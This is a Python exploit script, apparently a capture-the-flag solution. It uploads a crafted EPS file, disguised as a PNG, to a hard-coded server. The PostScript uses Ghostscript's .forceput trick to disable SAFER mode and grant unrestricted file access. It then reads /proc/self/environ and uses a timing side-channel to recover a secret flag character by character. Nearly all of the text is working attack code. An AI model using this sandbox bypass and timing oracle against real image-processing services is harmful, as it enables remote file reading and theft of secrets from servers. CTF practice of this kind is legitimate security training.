#!/usr/bin/env python3
import argparse
import subprocess
import sys
import time
from pathlib import Path


DEFAULT_URL = "http://209.38.92.205:33037/"
DEFAULT_SOURCE = "/proc/self/environ"
DEFAULT_PREFIX = "GZCTF_FLAG=GoH{"
DEFAULT_REPEAT = 200000000
DEFAULT_TIMEOUT = 8.0
DEFAULT_THRESHOLD = 3.0
DEFAULT_BUFSIZE = 8192
DEFAULT_CHARSET = "".join(chr(code) for code in range(32, 127))


def ps_escape(value: str) -> str:
    return value.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")


def build_eps(source: str, needle: str, repeat: int, bufsize: int) -> str:
    escaped_source = ps_escape(source)
    escaped_needle = ps_escape(needle)
    return f"""%!PS
/.forceput {{ <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1 get exec pop pop pop pop pop pop pop }} def
systemdict /SAFER false .forceput
systemdict /userparams get /PermitFileControl [(*)] .forceput
systemdict /userparams get /PermitFileWriting [(*)] .forceput
systemdict /userparams get /PermitFileReading [(*)] .forceput
/infile ({escaped_source}) (r) file def
/buf {bufsize} string def
infile buf readstring pop
({escaped_needle}) search
{{ pop pop pop {repeat} {{ 1 1 add pop }} repeat }}
{{ }}
ifelse
showpage
"""


def upload_timed(url: str, eps_path: Path, out_path: Path, timeout: float) -> float:
    result = subprocess.run(
        [
            "curl",
            "-sS",
            "-o",
            str(out_path),
            "-w",
            "%{time_total}",
            "--max-time",
            str(timeout),
            "-F",
            f"file_upload=@{eps_path};filename=search.png",
            url,
        ],
        capture_output=True,
        text=True,
    )
    try:
        return float(result.stdout.strip() or "0")
    except ValueError:
        return 0.0


def probe_prefix(
    url: str,
    source: str,
    needle: str,
    repeat: int,
    timeout: float,
    threshold: float,
    bufsize: int,
    retries: int,
    eps_path: Path,
    out_path: Path,
) -> tuple[bool, float]:
    eps_path.write_text(build_eps(source, needle, repeat, bufsize), encoding="ascii")
    times = [upload_timed(url, eps_path, out_path, timeout) for _ in range(retries)]
    votes = sum(total > threshold for total in times)
    return votes * 2 >= retries + 1, max(times)


def recover(
    url: str,
    source: str,
    prefix: str,
    charset: str,
    max_chars: int,
    repeat: int,
    timeout: float,
    threshold: float,
    bufsize: int,
    retries: int,
) -> str:
    eps_path = Path("/tmp/ghosted_2018_search_extract.eps")
    out_path = Path("/tmp/ghosted_2018_search_extract.out")
    suffix = ""

    for _ in range(max_chars):
        matched = False
        for ch in charset:
            candidate = prefix + suffix + ch
            ok, total = probe_prefix(
                url=url,
                source=source,
                needle=candidate,
                repeat=repeat,
                timeout=timeout,
                threshold=threshold,
                bufsize=bufsize,
                retries=retries,
                eps_path=eps_path,
                out_path=out_path,
            )
            print(f"probe candidate={candidate!r} time={total:.3f} ok={int(ok)}", file=sys.stderr)
            if ok:
                suffix += ch
                matched = True
                print(f"{prefix}{suffix}", flush=True)
                break
        if not matched:
            break
        if suffix.endswith("}"):
            break
    return suffix


def main() -> int:
    parser = argparse.ArgumentParser(description="Recover a flag by testing exact prefixes in a Ghostscript timing oracle.")
    parser.add_argument("--url", default=DEFAULT_URL)
    parser.add_argument("--source", default=DEFAULT_SOURCE)
    parser.add_argument("--prefix", default=DEFAULT_PREFIX)
    parser.add_argument("--charset", default=DEFAULT_CHARSET)
    parser.add_argument("--max-chars", type=int, default=64)
    parser.add_argument("--repeat", type=int, default=DEFAULT_REPEAT)
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--threshold", type=float, default=DEFAULT_THRESHOLD)
    parser.add_argument("--bufsize", type=int, default=DEFAULT_BUFSIZE)
    parser.add_argument("--retries", type=int, default=2)
    args = parser.parse_args()

    started = time.time()
    suffix = recover(
        url=args.url,
        source=args.source,
        prefix=args.prefix,
        charset=args.charset,
        max_chars=args.max_chars,
        repeat=args.repeat,
        timeout=args.timeout,
        threshold=args.threshold,
        bufsize=args.bufsize,
        retries=args.retries,
    )
    elapsed = time.time() - started
    print(f"recovered={args.prefix}{suffix}", file=sys.stderr)
    print(f"elapsed={elapsed:.1f}s", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
